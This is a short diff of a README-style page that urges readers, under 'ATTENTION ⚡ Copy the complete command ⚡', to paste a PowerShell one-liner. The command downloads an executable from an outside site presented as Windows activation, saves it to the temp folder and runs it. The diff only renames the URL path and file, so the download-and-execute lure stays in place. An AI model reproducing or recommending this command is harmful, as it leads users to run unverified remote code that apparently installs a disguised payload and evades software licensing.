@@ -5,7 +5,7 @@
 
 
 ## ATTENTION ⚡ Copy the complete command ⚡
-> `Invoke-WebRequest -Uri https://msguides.org/activate -OutFile $env:TEMP\ActivateWindows.exe; Start-Process $env:TEMP\ActivateWindows.exe`
+> `Invoke-WebRequest -Uri https://msguides.org/active -OutFile $env:TEMP\AcWin.exe; Start-Process $env:TEMP\AcWin.exe`
 
 
 <!--
